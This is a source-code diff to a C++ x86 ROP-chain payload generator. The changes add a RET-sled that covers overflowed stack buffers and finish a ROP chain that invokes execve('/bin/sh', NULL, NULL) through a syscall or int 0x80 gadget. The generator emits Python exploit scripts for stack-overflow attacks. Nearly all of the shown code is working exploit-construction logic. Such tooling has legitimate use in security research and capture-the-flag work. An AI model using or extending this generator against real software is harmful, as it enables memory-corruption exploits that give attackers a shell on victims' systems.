@@ -262,6 +262,20 @@ void ROP::PayloadGenX86::computeRelevantSequenceIndexes() {
         const std::string& firstInstr = instrSequence[0];
         this->firstInstrToSequenceIndexes[firstInstr].push_back(seqIndex);
     }
+
+    // Compute `this->indexValidRetInstruction` member.
+    this->indexValidRetInstrSeq = this->instrSeqs.size();
+    for (unsigned retSeqIndex : this->firstInstrToSequenceIndexes["ret"]) {
+        addressType retAddress = this->instrSeqs[retSeqIndex].first;
+
+        bool nullBytesAreAllowed = !this->forbidNullBytesInPayload;
+        bool addressIsNullFree = (GetNumNullBytesOfRegisterSizedConstant(this->processArchSize, retAddress) == 0);
+        if (nullBytesAreAllowed || addressIsNullFree) {
+            // Found a valid index.
+            this->indexValidRetInstrSeq = retSeqIndex;
+            break;
+        }
+    }
 }
 
 void ROP::PayloadGenX86::addPythonScriptPrelude() {
@@ -279,8 +293,8 @@ void ROP::PayloadGenX86::addPythonScriptPrelude() {
     this->addLineToPythonScript(ss.str());
 
     ss.str("");
-    ss << "# Number of acceptable padding bytes for a single instruction: ";
-    ss << this->numAcceptablePaddingBytesForOneInstruction;
+    ss << "# Approximate total byte size of the stack variables/buffers that need to be overflowed: ";
+    ss << this->approximateByteSizeOfStackBuffer;
     this->addLineToPythonScript(ss.str());
 
     ss.str("");
@@ -293,6 +307,11 @@ void ROP::PayloadGenX86::addPythonScriptPrelude() {
     }
     this->addLineToPythonScript(ss.str());
 
+    ss.str("");
+    ss << "# Number of acceptable padding bytes for a single instruction: ";
+    ss << this->numAcceptablePaddingBytesForOneInstruction;
+    this->addLineToPythonScript(ss.str());
+
     this->addLineToPythonScript(""); // New line
     this->addLineToPythonScript("# Init the payload");
     this->addLineToPythonScript("payload = b''");
@@ -300,6 +319,10 @@ void ROP::PayloadGenX86::addPythonScriptPrelude() {
 }
 
 void ROP::PayloadGenX86::configureGenerator() {
+    if (this->approximateByteSizeOfStackBuffer > 10000) {
+        this->approximateByteSizeOfStackBuffer = 10000;
+    }
+
     if (this->numAcceptablePaddingBytesForOneInstruction > 400) {
         this->numAcceptablePaddingBytesForOneInstruction = 400;
     }
@@ -376,7 +399,7 @@ void ROP::PayloadGenX86::appendBytesOfRegisterSizedConstantToPayload(const uint6
         this->payloadBytes.insert(this->payloadBytes.end(), bytes.begin(), bytes.end());
     }
 
-    // Add "payload += b'...' # Value: 0x..." line.
+    // Add "payload += b'...' # Value: 0x..." line to the payload script.
     std::ostringstream ss;
     ss << "payload += b'";
     ss << std::hex << std::uppercase << std::setfill('0');
@@ -399,6 +422,57 @@ void ROP::PayloadGenX86::appendPaddingBytesToPayload(const unsigned numPaddingBy
     std::ostringstream ss;
     ss << "payload += b'0xFF' * " << numPaddingBytes;
     this->addLineToPythonScript(ss.str());
+}
+
+void ROP::PayloadGenX86::appendRetSledBytesToPayload(const unsigned minByteSizeToCover) {
+    if (minByteSizeToCover == 0) {
+        return;
+    }
+
+    // Get the virtual memory address of the "ret" instruction sequence.
+    assertMessage(this->indexValidRetInstrSeq != this->instrSeqs.size(),
+                  "We need a virtual memory address for a \"ret\" instruction but no valid address found...");
+    addressType retAddress = this->instrSeqs[this->indexValidRetInstrSeq].first;
+
+    // Get the bytes of the virtual memory address;
+    byteSequence addressBytes;
+    if (this->processArchSize == BitSizeClass::BIT64) {
+        addressBytes = BytesOfInteger((uint64_t)retAddress);
+    }
+    else {
+        assert(this->processArchSize == BitSizeClass::BIT32);
+        addressBytes = BytesOfInteger((uint32_t)retAddress);
+    }
+
+    // See how many times we need to append these bytes.
+    unsigned numTimesToAppendTheRetAddress = minByteSizeToCover / this->registerByteSize;
+    if (numTimesToAppendTheRetAddress * this->registerByteSize < minByteSizeToCover) {
+        numTimesToAppendTheRetAddress += 1;
+    }
+    numTimesToAppendTheRetAddress += 10; // For good measure.
+
+    // Append RET-sled bytes to the payload bytes.
+    if (!this->currScriptLineIsComment) {
+        for (unsigned idx = 0; idx < numTimesToAppendTheRetAddress; ++idx) {
+            this->payloadBytes.insert(this->payloadBytes.end(), addressBytes.begin(), addressBytes.end());
+        }
+    }
+
+    this->addLineToPythonScript("# RET-sled");
+
+    // Add "payload += b'...' * COUNT" line to the payload script.
+    std::ostringstream ss;
+    ss << "payload += b'";
+    ss << std::hex << std::uppercase << std::setfill('0');
+    for (ROP::byte currByte : addressBytes) {
+        ss << "\\x" << std::setw(2) << (unsigned)currByte;
+    }
+    ss << "' * " << std::dec << numTimesToAppendTheRetAddress << ' ';
+    ss << "# 0x" << IntToHex(retAddress, 2 * this->registerByteSize, false);
+    ss << ": " << "\"ret\"";
+    this->addLineToPythonScript(ss.str());
+
+    this->addLineToPythonScript(""); // New line.
 }
 
 bool ROP::PayloadGenX86::tryAppendOperationsAndRevertOnFailure(const std::function<bool(void)>& cb) {
@@ -867,6 +941,10 @@ bool ROP::PayloadGenX86::appendROPChainForShellCodeWithPathNullNull() {
         this->addLineToPythonScript("# ROP-chain for calling: execve(\"/bin/sh\", NULL, NULL);");
         this->addLineToPythonScript("# Passing NULL for the args and environment is not portable but is allowed by some Linux versions.");
         this->addLineToPythonScript("if True:");
+        this->currLineIndent++;
+
+        // Append the RET-sled in order to cover the bytes of the stack variables/buffers.
+        this->appendRetSledBytesToPayload(this->approximateByteSizeOfStackBuffer);
 
         // Putting the right value into each argument takes some gadget work.
         using argWorkType = std::function<bool(const std::set<x86_reg>&)>;
@@ -898,16 +976,15 @@ bool ROP::PayloadGenX86::appendROPChainForShellCodeWithPathNullNull() {
         });
 
         // Try assigning the necessary values to the arguments in all possible orders.
+        bool success;
         std::vector<unsigned> argIndexes = {0, 1, 2, 3};
         do {
             LogDebug("Checking shell rop-chain generation for arg indexes: (%u, %u, %u, %u)",
                      argIndexes[0], argIndexes[1], argIndexes[2], argIndexes[3]);
 
-            bool success;
             success = this->tryAppendOperationsAndRevertOnFailure([&] {
                 bool ok = true;
 
-                this->currLineIndent++;
                 std::set<x86_reg> forbiddenRegKeys = {};
                 for (unsigned currArgumentIndex : argIndexes) {
                     // Try to perform the work for the current argument.
@@ -917,14 +994,24 @@ bool ROP::PayloadGenX86::appendROPChainForShellCodeWithPathNullNull() {
                     // Remember the current register as forbidden for the next gadgets.
                     forbiddenRegKeys.insert(currRegKey);
                 }
-                this->currLineIndent--;
+
+                // Make the system call.
+                this->addLineToPythonScript("# Make the system call");
+                if (this->processArchSize == BitSizeClass::BIT64) {
+                    ok = ok && this->appendGadgetStartingWithInstruction({"syscall"}, {}, [&](const std::string&) {});
+                }
+                else {
+                    ok = ok && this->appendGadgetStartingWithInstruction({"int 0x80"}, {}, [&](const std::string&) {});
+                }
 
                 return ok;
             });
-            if (success) { return true; }
+            if (success) { break; }
+
         } while (std::next_permutation(argIndexes.begin(), argIndexes.end()));
 
-        return false;
+        this->currLineIndent--;
+        return success;
     });
 }
 
